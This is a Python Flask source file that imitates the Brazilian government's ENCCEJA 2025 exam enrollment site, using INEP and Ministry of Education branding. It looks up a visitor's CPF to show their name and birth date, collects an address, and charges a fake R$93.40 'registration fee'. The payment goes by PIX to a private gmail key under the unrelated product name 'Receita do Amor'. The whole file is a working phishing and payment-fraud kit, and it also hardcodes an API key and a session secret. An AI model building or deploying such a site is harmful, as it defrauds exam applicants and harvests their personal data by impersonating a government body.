#!/usr/bin/env python3
"""
ENCCEJA 2025 - Deploy Completo para VPS Ubuntu Hostinger
Versão otimizada para produção com todas as APIs funcionais
"""

import os
import sys
import json
import time
import re
import logging
import secrets
import requests
import base64
from datetime import datetime
from io import BytesIO

# Configuração Flask
from flask import Flask, render_template, request, jsonify, redirect, url_for, session

# Configuração de encoding
if sys.version_info[0] >= 3:
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

app = Flask(__name__)

# Configuração segura
app.secret_key = os.environ.get("SESSION_SECRET", "encceja-vps-ubuntu-2025-hostinger")

# Logging configurado para produção
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [VPS-UBUNTU] %(levelname)s: %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/tmp/encceja_app.log', encoding='utf-8')
    ]
)

# Função para gerar QR Code com fallback
def generate_qr_code_safe(pix_code: str) -> str:
    """Gera QR code com tratamento de erro robusto"""
    try:
        import qrcode
        from qrcode import constants
        
        qr = qrcode.QRCode(
            version=1,
            error_correction=constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(pix_code)
        qr.make(fit=True)

        img = qr.make_image(fill_color="black", back_color="white")
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return f"data:image/png;base64,{img_str}"
    except ImportError:
        app.logger.warning("[VPS-UBUNTU] QRCode library not available")
        return ""
    except Exception as e:
        app.logger.error(f"[VPS-UBUNTU] Erro ao gerar QR code: {e}")
        return ""

# Função WitePay com fallback robusto
def create_witepay_payment_robust(user_data: dict, amount: float = 93.40) -> dict:
    """Cria pagamento WitePay com fallback PIX garantido"""
    app.logger.info(f"[VPS-UBUNTU] Iniciando criação de pagamento para {user_data.get('nome', 'N/A')}")
    
    try:
        # Credenciais WitePay
        witepay_key = os.environ.get('WITEPAY_API_KEY', 'sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d')
        
        # Dados para pedido
        order_data = {
            "productData": [{
                "name": "Receita do Amor",
                "value": int(amount * 100)
            }],
            "clientData": {
                "clientName": user_data.get('nome', 'Cliente ENCCEJA'),
                "clientDocument": user_data.get('cpf', '00000000000'),
                "clientEmail": 'gerarpagamentos@gmail.com',
                "clientPhone": '11987790088'
            }
        }
        
        headers = {
            'x-api-key': witepay_key,
            'Content-Type': 'application/json',
            'User-Agent': 'ENCCEJA-VPS-Ubuntu/1.0'
        }
        
        app.logger.info("[VPS-UBUNTU] Tentando criar pedido no WitePay")
        
        # Criar pedido
        response = requests.post(
            'https://api.witepay.com.br/v1/order/create',
            headers=headers,
            json=order_data,
            timeout=15
        )
        
        app.logger.info(f"[VPS-UBUNTU] Resposta order/create: {response.status_code}")
        
        if response.status_code == 200:
            order_result = response.json()
            order_id = order_result.get('orderId')
            
            if order_id:
                app.logger.info(f"[VPS-UBUNTU] Order ID criado: {order_id}")
                
                # Criar cobrança PIX
                charge_data = {"paymentMethod": "pix"}
                
                charge_response = requests.post(
                    f'https://api.witepay.com.br/v1/charge/create/{order_id}',
                    headers=headers,
                    json=charge_data,
                    timeout=15
                )
                
                app.logger.info(f"[VPS-UBUNTU] Resposta charge/create: {charge_response.status_code}")
                
                if charge_response.status_code == 200:
                    charge_result = charge_response.json()
                    pix_code = charge_result.get('pixCode') or charge_result.get('qr_code')
                    
                    if pix_code and len(pix_code) > 20:
                        transaction_id = charge_result.get('chargeId', f"ENCCEJA{int(time.time())}")
                        
                        app.logger.info(f"[VPS-UBUNTU] WitePay PIX criado com sucesso - ID: {transaction_id}")
                        
                        return {
                            'success': True,
                            'pixCode': pix_code,
                            'transactionId': transaction_id,
                            'amount': amount,
                            'method': 'witepay',
                            'qrCodeImage': generate_qr_code_safe(pix_code)
                        }
                    else:
                        app.logger.warning("[VPS-UBUNTU] WitePay não retornou PIX code válido")
                else:
                    app.logger.warning(f"[VPS-UBUNTU] Erro na criação da cobrança: {charge_response.text}")
            else:
                app.logger.warning("[VPS-UBUNTU] WitePay não retornou order_id")
        else:
            app.logger.warning(f"[VPS-UBUNTU] Erro na criação do pedido: {response.text}")
            
    except requests.exceptions.Timeout:
        app.logger.warning("[VPS-UBUNTU] Timeout na API WitePay")
    except requests.exceptions.RequestException as e:
        app.logger.warning(f"[VPS-UBUNTU] Erro de conexão WitePay: {e}")
    except Exception as e:
        app.logger.warning(f"[VPS-UBUNTU] Erro geral WitePay: {e}")
    
    # Fallback garantido - PIX direto
    app.logger.info("[VPS-UBUNTU] Usando fallback PIX direto")
    
    transaction_id = f"ENCCEJA{int(time.time())}"
    pix_key = "gerarpagamentos@gmail.com"
    merchant_name = "Receita do Amor - ENCCEJA"
    merchant_city = "SAO PAULO"
    
    # Construir PIX padrão Banco Central
    pix_identifier = f"25{len(pix_key):02d}{pix_key}"
    amount_str = f"{int(amount*100):02d}"
    transaction_str = f"{len(transaction_id):02d}{transaction_id}"
    
    pix_payload = f"00020126{len(pix_identifier):02d}14br.gov.bcb.pix{pix_identifier}52040000530398654{amount_str}5925{merchant_name}6009{merchant_city}62{transaction_str}6304"
    
    # Calcular CRC16 CCITT
    def calculate_crc16_ccitt(data):
        crc = 0xFFFF
        for byte in data.encode('utf-8'):
            crc ^= byte << 8
            for _ in range(8):
                if crc & 0x8000:
                    crc = (crc << 1) ^ 0x1021
                else:
                    crc <<= 1
                crc &= 0xFFFF
        return f"{crc:04X}"
    
    crc = calculate_crc16_ccitt(pix_payload)
    pix_code_final = pix_payload + crc
    
    app.logger.info(f"[VPS-UBUNTU] PIX fallback criado - ID: {transaction_id}, Tamanho: {len(pix_code_final)}")
    
    return {
        'success': True,
        'pixCode': pix_code_final,
        'transactionId': transaction_id,
        'amount': amount,
        'method': 'fallback_pix',
        'qrCodeImage': generate_qr_code_safe(pix_code_final)
    }

# === ROTAS PRINCIPAIS ===

@app.route('/')
@app.route('/index')
def index():
    """Página principal - redireciona para inscrição"""
    app.logger.info("[VPS-UBUNTU] Acesso à página principal")
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
def inscricao():
    """Página de inscrição com CPF"""
    app.logger.info("[VPS-UBUNTU] Renderizando página de inscrição")
    
    # Template inline com JavaScript corrigido
    return '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Inscrição Nacional</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; line-height: 1.6; }
        
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        
        .header { 
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); 
            color: white; padding: 30px 20px; text-align: center; 
            border-radius: 12px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        .header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 10px; }
        .header p { font-size: 1.1rem; opacity: 0.9; }
        
        .form-container { 
            background: white; padding: 40px; border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-bottom: 30px;
        }
        
        .form-title { color: #2c3e50; font-size: 1.8rem; margin-bottom: 30px; text-align: center; }
        
        .form-group { margin-bottom: 25px; }
        .form-group label { 
            display: block; margin-bottom: 8px; font-weight: 600; 
            color: #34495e; font-size: 1rem;
        }
        .form-group input { 
            width: 100%; padding: 15px; font-size: 1.1rem; 
            border: 2px solid #e1e8ed; border-radius: 8px; 
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        .form-group input:focus { 
            outline: none; border-color: #2a5298; 
            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
        }
        
        .info-box { 
            background: #e8f4fd; border: 1px solid #bee5eb; 
            padding: 20px; border-radius: 8px; margin: 20px 0;
            border-left: 4px solid #2a5298;
        }
        .info-box p { color: #0c5460; margin-bottom: 10px; }
        
        .btn { 
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%); 
            color: white; padding: 15px 30px; font-size: 1.1rem; 
            border: none; border-radius: 8px; cursor: pointer; 
            width: 100%; font-weight: 600; text-transform: uppercase;
            transition: all 0.3s; box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }
        .btn:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
        }
        .btn:disabled { 
            background: #6c757d; cursor: not-allowed; 
            transform: none; box-shadow: none;
        }
        
        .loading { 
            display: none; text-align: center; margin: 20px 0; 
            color: #2a5298; font-weight: 500;
        }
        .loading::after {
            content: ''; display: inline-block; width: 20px; height: 20px; 
            border: 3px solid #f3f3f3; border-top: 3px solid #2a5298; 
            border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .resultado { margin: 25px 0; padding: 20px; border-radius: 8px; }
        .success { 
            background: #d4edda; border: 1px solid #c3e6cb; color: #155724;
            box-shadow: 0 4px 15px rgba(212, 237, 218, 0.5);
        }
        .error { 
            background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24;
            box-shadow: 0 4px 15px rgba(248, 215, 218, 0.5);
        }
        
        .continue-btn { 
            background: linear-gradient(135deg, #007bff 0%, #0056b3 100%); 
            color: white; padding: 12px 25px; text-decoration: none; 
            border-radius: 6px; display: inline-block; margin-top: 15px;
            font-weight: 600; text-transform: uppercase; font-size: 0.9rem;
            transition: all 0.3s; box-shadow: 0 4px 15px rgba(0, 123, 255, 0.3);
        }
        .continue-btn:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.4);
            text-decoration: none; color: white;
        }
        
        .gov-footer { 
            text-align: center; padding: 20px; color: #6c757d; 
            border-top: 1px solid #e9ecef; margin-top: 40px;
        }
        
        @media (max-width: 768px) {
            .container { padding: 15px; }
            .header h1 { font-size: 2rem; }
            .form-container { padding: 25px 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ENCCEJA 2025</h1>
            <p>Exame Nacional para Certificação de Competências de Jovens e Adultos</p>
            <p style="font-size: 0.9rem; margin-top: 10px;">Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira</p>
        </div>
        
        <div class="form-container">
            <h2 class="form-title">Consulta de CPF</h2>
            
            <form id="cpfForm" onsubmit="consultarCPF(event)">
                <div class="form-group">
                    <label for="cpfInput">Digite seu CPF para consulta:</label>
                    <input type="text" id="cpfInput" placeholder="000.000.000-00" maxlength="14" required>
                </div>
                
                <div class="info-box">
                    <p><strong>Informação importante:</strong></p>
                    <p>• Após a consulta do CPF, você será direcionado para as próximas etapas do processo de inscrição.</p>
                    <p>• Certifique-se de que seus dados estão atualizados na Receita Federal.</p>
                    <p>• O processo de inscrição é gratuito para quem tem direito à isenção.</p>
                </div>
                
                <button type="submit" class="btn" id="submitBtn">Consultar CPF na Base Nacional</button>
                <div class="loading" id="loading">Consultando dados na base oficial do governo...</div>
            </form>
            
            <div id="resultado"></div>
        </div>
        
        <div class="gov-footer">
            <p><strong>Governo Federal - Ministério da Educação - INEP</strong></p>
            <p>Sistema oficial de inscrições ENCCEJA 2025</p>
        </div>
    </div>
    
    <script>
    function formatarCPF(valor) {
        return valor.replace(/(\\d{3})(\\d{3})(\\d{3})(\\d{2})/, '$1.$2.$3-$4');
    }
    
    document.getElementById('cpfInput').addEventListener('input', function(e) {
        let valor = e.target.value.replace(/\\D/g, '');
        if (valor.length <= 11) {
            e.target.value = formatarCPF(valor);
        }
    });
    
    function consultarCPF(event) {
        event.preventDefault();
        
        const cpfInput = document.getElementById('cpfInput');
        const loading = document.getElementById('loading');
        const resultado = document.getElementById('resultado');
        const submitBtn = document.getElementById('submitBtn');
        
        const cpf = cpfInput.value.replace(/\\D/g, '');
        
        if (cpf.length !== 11) {
            alert('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }
        
        // UI Loading
        submitBtn.disabled = true;
        submitBtn.textContent = 'Consultando...';
        loading.style.display = 'block';
        resultado.innerHTML = '';
        
        // Chamada para API
        fetch('/api/consultar-cpf?cpf=' + cpf)
        .then(response => response.json())
        .then(data => {
            loading.style.display = 'none';
            submitBtn.disabled = false;
            submitBtn.textContent = 'Consultar CPF na Base Nacional';
            
            if (data.success) {
                resultado.innerHTML = 
                    '<div class="resultado success">' +
                    '<h3 style="margin-bottom: 15px;">✅ CPF Localizado na Base de Dados!</h3>' +
                    '<p><strong>Nome Completo:</strong> ' + data.nome + '</p>' +
                    '<p><strong>CPF:</strong> ' + data.cpf + '</p>' +
                    '<p><strong>Data de Nascimento:</strong> ' + data.dataNascimento + '</p>' +
                    '<p><strong>Situação Cadastral:</strong> Regular</p>' +
                    '<p style="margin-top: 15px; color: #28a745;"><strong>✓ Dados confirmados! Você pode prosseguir com a inscrição.</strong></p>' +
                    '<a href="/encceja-info" class="continue-btn">Continuar Inscrição no ENCCEJA</a>' +
                    '</div>';
            } else {
                resultado.innerHTML = 
                    '<div class="resultado error">' +
                    '<h3 style="margin-bottom: 15px;">❌ Problema na Consulta</h3>' +
                    '<p><strong>Erro:</strong> ' + data.error + '</p>' +
                    '<p style="margin-top: 15px;">Verifique se o CPF foi digitado corretamente ou tente novamente em alguns minutos.</p>' +
                    '</div>';
            }
        })
        .catch(error => {
            loading.style.display = 'none';
            submitBtn.disabled = false;
            submitBtn.textContent = 'Consultar CPF na Base Nacional';
            resultado.innerHTML = 
                '<div class="resultado error">' +
                '<h3 style="margin-bottom: 15px;">❌ Erro de Conexão</h3>' +
                '<p>Não foi possível conectar com o servidor. Tente novamente em alguns instantes.</p>' +
                '</div>';
            console.error('Erro na consulta:', error);
        });
    }
    </script>
</body>
</html>'''

@app.route('/encceja-info')
def encceja_info():
    """Informações sobre o ENCCEJA"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("[VPS-UBUNTU] Renderizando encceja-info")
    user_data = session['user_data']
    
    return f'''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Informações do Exame</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; line-height: 1.6; }}
        .container {{ max-width: 900px; margin: 0 auto; padding: 20px; }}
        
        .header {{ 
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); 
            color: white; padding: 30px 20px; text-align: center; 
            border-radius: 12px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }}
        .header h1 {{ font-size: 2.2rem; font-weight: 700; margin-bottom: 10px; }}
        
        .content-box {{ 
            background: white; padding: 30px; border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-bottom: 25px;
        }}
        
        .user-info {{ 
            background: linear-gradient(135deg, #e8f4fd 0%, #f0f8ff 100%); 
            border-left: 5px solid #2a5298; padding: 25px; margin: 25px 0; 
            border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }}
        .user-info h3 {{ color: #2a5298; margin-bottom: 15px; }}
        .user-info p {{ margin-bottom: 8px; color: #2c3e50; }}
        
        .exam-details {{ 
            background: linear-gradient(135deg, #fff3cd 0%, #fef9e7 100%); 
            border: 1px solid #ffeaa7; padding: 25px; border-radius: 8px; 
            margin: 25px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }}
        .exam-details h3 {{ color: #856404; margin-bottom: 15px; }}
        .exam-details .highlight {{ color: #d73527; font-weight: bold; font-size: 1.3rem; }}
        
        .info-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 25px 0; }}
        .info-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #28a745; }}
        .info-card h4 {{ color: #28a745; margin-bottom: 10px; }}
        
        .btn {{ 
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%); 
            color: white; padding: 15px 30px; font-size: 1.1rem; 
            border: none; border-radius: 8px; cursor: pointer; 
            text-decoration: none; display: inline-block; font-weight: 600;
            transition: all 0.3s; box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }}
        .btn:hover {{ 
            transform: translateY(-2px); 
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
            text-decoration: none; color: white;
        }}
        
        ul {{ padding-left: 20px; margin: 15px 0; }}
        li {{ margin-bottom: 8px; }}
        
        @media (max-width: 768px) {{
            .container {{ padding: 15px; }}
            .header h1 {{ font-size: 1.8rem; }}
            .content-box {{ padding: 20px; }}
            .info-grid {{ grid-template-columns: 1fr; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Informações do ENCCEJA 2025</h1>
            <p>Certificação de Competências de Jovens e Adultos</p>
        </div>
        
        <div class="content-box">
            <div class="user-info">
                <h3>📋 Dados do Candidato Confirmados</h3>
                <p><strong>Nome:</strong> {user_data.get('nome', 'N/A')}</p>
                <p><strong>CPF:</strong> {user_data.get('cpf', 'N/A')}</p>
                <p><strong>Data de Nascimento:</strong> {user_data.get('dataNascimento', 'N/A')}</p>
                <p><strong>Situação:</strong> <span style="color: #28a745; font-weight: bold;">✓ Apto para inscrição</span></p>
            </div>
            
            <div class="exam-details">
                <h3>📚 Sobre o ENCCEJA 2025</h3>
                <p>O Exame Nacional para Certificação de Competências de Jovens e Adultos (ENCCEJA) é realizado pelo Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira (INEP), autarquia vinculada ao Ministério da Educação.</p>
                
                <p><strong>Objetivo:</strong> Certificar competências, habilidades e saberes de jovens e adultos que não concluíram o ensino fundamental ou médio na idade apropriada.</p>
                
                <p class="highlight">💰 Taxa de Inscrição: R$ 93,40</p>
                
                <p><strong>🎯 Modalidades disponíveis:</strong></p>
                <ul>
                    <li><strong>Ensino Fundamental:</strong> Para maiores de 15 anos completos</li>
                    <li><strong>Ensino Médio:</strong> Para maiores de 18 anos completos</li>
                </ul>
            </div>
            
            <div class="info-grid">
                <div class="info-card">
                    <h4>📖 Áreas de Conhecimento - Fundamental</h4>
                    <ul>
                        <li>Língua Portuguesa, Língua Estrangeira, Artes e Ed. Física</li>
                        <li>Matemática</li>
                        <li>História e Geografia</li>
                        <li>Ciências Naturais</li>
                    </ul>
                </div>
                
                <div class="info-card">
                    <h4>📖 Áreas de Conhecimento - Médio</h4>
                    <ul>
                        <li>Linguagens e Códigos</li>
                        <li>Matemática</li>
                        <li>Ciências Humanas</li>
                        <li>Ciências da Natureza</li>
                    </ul>
                </div>
                
                <div class="info-card">
                    <h4>📅 Cronograma 2025</h4>
                    <ul>
                        <li><strong>Inscrições:</strong> Janeiro a Março</li>
                        <li><strong>Aplicação:</strong> Maio de 2025</li>
                        <li><strong>Resultados:</strong> Julho de 2025</li>
                        <li><strong>Certificação:</strong> Agosto de 2025</li>
                    </ul>
                </div>
                
                <div class="info-card">
                    <h4>📋 Documentos Necessários</h4>
                    <ul>
                        <li>CPF (obrigatório)</li>
                        <li>RG ou documento oficial com foto</li>
                        <li>Comprovante de residência</li>
                        <li>Comprovante de pagamento da taxa</li>
                    </ul>
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 30px;">
                <p style="margin-bottom: 20px; font-size: 1.1rem; color: #2c3e50;"><strong>Próximo passo:</strong> Validar seus dados pessoais e prosseguir com a inscrição oficial.</p>
                <a href="/validar-dados" class="btn">Validar Dados e Continuar ➤</a>
            </div>
        </div>
    </div>
</body>
</html>'''

@app.route('/validar-dados')
def validar_dados():
    """Validação de dados pessoais"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("[VPS-UBUNTU] Renderizando validar-dados")
    user_data = session['user_data']
    
    return f'''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Validar Dados Pessoais</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; line-height: 1.6; }}
        .container {{ max-width: 700px; margin: 0 auto; padding: 20px; }}
        
        .header {{ 
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); 
            color: white; padding: 30px 20px; text-align: center; 
            border-radius: 12px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }}
        .header h1 {{ font-size: 2rem; font-weight: 700; margin-bottom: 10px; }}
        
        .form-container {{ 
            background: white; padding: 40px; border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-bottom: 30px;
        }}
        
        .form-group {{ margin-bottom: 25px; }}
        .form-group label {{ 
            display: block; margin-bottom: 8px; font-weight: 600; 
            color: #34495e; font-size: 1rem;
        }}
        .form-group input {{ 
            width: 100%; padding: 15px; font-size: 1.1rem; 
            border: 2px solid #e1e8ed; border-radius: 8px; 
            background: #f8f9fa; color: #495057;
        }}
        .readonly {{ background: #e9ecef !important; color: #6c757d !important; }}
        
        .info-alert {{ 
            background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%); 
            border: 1px solid #bee5eb; padding: 25px; border-radius: 8px; 
            margin: 25px 0; border-left: 4px solid #2a5298;
        }}
        .info-alert h4 {{ color: #2a5298; margin-bottom: 15px; }}
        .info-alert p {{ color: #0c5460; margin-bottom: 10px; }}
        
        .btn {{ 
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%); 
            color: white; padding: 15px 30px; font-size: 1.1rem; 
            border: none; border-radius: 8px; cursor: pointer; 
            width: 100%; font-weight: 600; text-transform: uppercase;
            transition: all 0.3s; box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }}
        .btn:hover {{ 
            transform: translateY(-2px); 
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
        }}
        
        @media (max-width: 768px) {{
            .container {{ padding: 15px; }}
            .form-container {{ padding: 25px 20px; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Validar Dados Pessoais</h1>
            <p>Confirme suas informações para prosseguir com a inscrição</p>
        </div>
        
        <div class="form-container">
            <div class="info-alert">
                <h4>🔍 Verificação de Dados</h4>
                <p><strong>Importante:</strong> Verifique cuidadosamente se todos os dados estão corretos.</p>
                <p>Estas informações serão utilizadas para:</p>
                <ul style="margin: 10px 0 0 20px;">
                    <li>Emissão do certificado de conclusão</li>
                    <li>Comunicações oficiais sobre o exame</li>
                    <li>Definição do local de prova</li>
                </ul>
            </div>
            
            <form method="POST" action="/salvar-validacao">
                <div class="form-group">
                    <label for="nome">Nome Completo (conforme Receita Federal):</label>
                    <input type="text" id="nome" name="nome" value="{user_data.get('nome', '')}" class="readonly" readonly>
                </div>
                
                <div class="form-group">
                    <label for="cpf">CPF:</label>
                    <input type="text" id="cpf" name="cpf" value="{user_data.get('cpf', '')}" class="readonly" readonly>
                </div>
                
                <div class="form-group">
                    <label for="data_nascimento">Data de Nascimento:</label>
                    <input type="text" id="data_nascimento" name="data_nascimento" value="{user_data.get('dataNascimento', '')}" class="readonly" readonly>
                </div>
                
                <div class="form-group">
                    <label for="situacao">Situação Cadastral:</label>
                    <input type="text" id="situacao" value="REGULAR - CPF ATIVO" class="readonly" readonly>
                </div>
                
                <div class="info-alert">
                    <p style="color: #28a745; font-weight: bold;">✓ Todos os dados foram validados com sucesso na base da Receita Federal.</p>
                    <p>Você pode prosseguir com segurança para a próxima etapa.</p>
                </div>
                
                <button type="submit" class="btn">Confirmar e Prosseguir</button>
            </form>
        </div>
    </div>
</body>
</html>'''

@app.route('/salvar-validacao', methods=['POST'])
def salvar_validacao():
    """Salvar validação e prosseguir"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("[VPS-UBUNTU] Dados validados, prosseguindo para endereço")
    return redirect(url_for('endereco'))

@app.route('/endereco')
def endereco():
    """Formulário de endereço"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("[VPS-UBUNTU] Renderizando página de endereço")
    
    return '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Dados de Endereço</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; line-height: 1.6; }
        .container { max-width: 700px; margin: 0 auto; padding: 20px; }
        
        .header { 
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); 
            color: white; padding: 30px 20px; text-align: center; 
            border-radius: 12px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        .header h1 { font-size: 2rem; font-weight: 700; margin-bottom: 10px; }
        
        .form-container { 
            background: white; padding: 40px; border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-bottom: 30px;
        }
        
        .form-group { margin-bottom: 25px; }
        .form-group label { 
            display: block; margin-bottom: 8px; font-weight: 600; 
            color: #34495e; font-size: 1rem;
        }
        .form-group input, .form-group select { 
            width: 100%; padding: 15px; font-size: 1.1rem; 
            border: 2px solid #e1e8ed; border-radius: 8px; 
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        .form-group input:focus, .form-group select:focus { 
            outline: none; border-color: #2a5298; 
            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
        }
        
        .required { color: #dc3545; font-weight: bold; }
        
        .info-box { 
            background: linear-gradient(135deg, #fff3cd 0%, #fef9e7 100%); 
            border: 1px solid #ffeaa7; padding: 20px; border-radius: 8px; 
            margin: 20px 0; border-left: 4px solid #856404;
        }
        .info-box p { color: #856404; margin-bottom: 10px; }
        
        .btn { 
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%); 
            color: white; padding: 15px 30px; font-size: 1.1rem; 
            border: none; border-radius: 8px; cursor: pointer; 
            width: 100%; font-weight: 600; text-transform: uppercase;
            transition: all 0.3s; box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }
        .btn:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
        }
        
        @media (max-width: 768px) {
            .container { padding: 15px; }
            .form-container { padding: 25px 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Dados de Endereço</h1>
            <p>Informe seu endereço atual para definição do local de prova</p>
        </div>
        
        <div class="form-container">
            <div class="info-box">
                <p><strong>📍 Importante sobre o endereço:</strong></p>
                <p>• O endereço informado será usado para definir o local de prova mais próximo de você.</p>
                <p>• Certifique-se de informar o endereço onde você reside atualmente.</p>
                <p>• O local exato da prova será informado no cartão de confirmação.</p>
            </div>
            
            <form method="POST" action="/salvar-endereco">
                <div class="form-group">
                    <label for="cep">CEP: <span class="required">*</span></label>
                    <input type="text" id="cep" name="cep" placeholder="00000-000" maxlength="9" required>
                </div>
                
                <div class="form-group">
                    <label for="cidade">Cidade: <span class="required">*</span></label>
                    <input type="text" id="cidade" name="cidade" placeholder="Nome da sua cidade" required>
                </div>
                
                <div class="form-group">
                    <label for="uf">Estado (UF): <span class="required">*</span></label>
                    <select id="uf" name="uf" required>
                        <option value="">Selecione seu estado...</option>
                        <option value="AC">Acre (AC)</option>
                        <option value="AL">Alagoas (AL)</option>
                        <option value="AP">Amapá (AP)</option>
                        <option value="AM">Amazonas (AM)</option>
                        <option value="BA">Bahia (BA)</option>
                        <option value="CE">Ceará (CE)</option>
                        <option value="DF">Distrito Federal (DF)</option>
                        <option value="ES">Espírito Santo (ES)</option>
                        <option value="GO">Goiás (GO)</option>
                        <option value="MA">Maranhão (MA)</option>
                        <option value="MT">Mato Grosso (MT)</option>
                        <option value="MS">Mato Grosso do Sul (MS)</option>
                        <option value="MG">Minas Gerais (MG)</option>
                        <option value="PA">Pará (PA)</option>
                        <option value="PB">Paraíba (PB)</option>
                        <option value="PR">Paraná (PR)</option>
                        <option value="PE">Pernambuco (PE)</option>
                        <option value="PI">Piauí (PI)</option>
                        <option value="RJ">Rio de Janeiro (RJ)</option>
                        <option value="RN">Rio Grande do Norte (RN)</option>
                        <option value="RS">Rio Grande do Sul (RS)</option>
                        <option value="RO">Rondônia (RO)</option>
                        <option value="RR">Roraima (RR)</option>
                        <option value="SC">Santa Catarina (SC)</option>
                        <option value="SP">São Paulo (SP)</option>
                        <option value="SE">Sergipe (SE)</option>
                        <option value="TO">Tocantins (TO)</option>
                    </select>
                </div>
                
                <button type="submit" class="btn">Salvar Endereço e Continuar</button>
            </form>
        </div>
    </div>
    
    <script>
    // Máscara para CEP
    document.getElementById('cep').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\\D/g, '');
        if (value.length > 5) {
            value = value.replace(/^(\\d{5})(\\d{3}).*/, '$1-$2');
        }
        e.target.value = value;
    });
    </script>
</body>
</html>'''

@app.route('/salvar-endereco', methods=['POST'])
def salvar_endereco():
    """Salvar endereço na sessão"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    endereco_data = {
        'cep': request.form.get('cep', '01000-000'),
        'cidade': request.form.get('cidade', 'São Paulo'),
        'uf': request.form.get('uf', 'SP')
    }
    
    session['endereco_data'] = endereco_data
    app.logger.info(f"[VPS-UBUNTU] Endereço salvo: {endereco_data['cidade']}, {endereco_data['uf']}")
    
